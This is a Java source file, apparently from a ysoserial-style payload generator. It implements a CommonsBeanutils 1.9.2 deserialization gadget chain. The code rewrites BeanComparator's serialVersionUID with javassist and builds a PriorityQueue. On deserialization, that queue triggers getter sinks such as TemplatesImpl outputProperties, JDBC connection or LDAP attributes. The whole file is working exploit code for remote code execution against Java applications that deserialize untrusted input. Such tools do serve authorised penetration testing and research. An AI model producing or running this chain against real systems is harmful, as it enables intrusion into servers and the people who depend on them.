package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.custom.CustomCommand;
import cn.butler.yso.payloads.util.Gadgets;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import cn.butler.payloads.PayloadRunner;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.yso.JavassistClassLoader;
import cn.butler.yso.payloads.util.Reflections;

import java.util.Comparator;
import java.util.PriorityQueue;

import static cn.butler.yso.payloads.util.Reflections.setFieldValue;

/**
 * 用commons-beanutils:1.9.2做的链子只是修改了BeanComparator类的suid
 * 所以这里@Dependencies注解依旧写1.9.2
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2","commons-logging:commons-logging:1.2"})
@Authors({ Authors.B0T1ER })
public class CommonsBeanutils2_16 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        final Object object = Gadgets.createGetter(command);
        // 修改BeanComparator类的serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        ctBeanComparator.defrost();
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = 2573799559215537819L;", ctBeanComparator));

        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        Reflections.setFieldValue(comparator, "property", null);
        Reflections.setFieldValue(comparator,"comparator",String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        String property_value = "";
        if (command.startsWith(CustomCommand.GETTER_JDBC)) {
            property_value = "connection";
        }else if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL) || command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)){
            property_value = "outputProperties";
        }else if(command.startsWith(CustomCommand.GETTER_LDAPATTRIBUTE)){
            property_value = "attributeDefinition";
        }else if(command.startsWith(CustomCommand.GETTER_SIGNEDOBJECT)){
            property_value = "object";
        }
        Reflections.setFieldValue(comparator, "property", property_value);
        setFieldValue(queue, "queue", new Object[]{object, object});
        ctBeanComparator.defrost();
        return queue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2_16.class, args);
    }
}
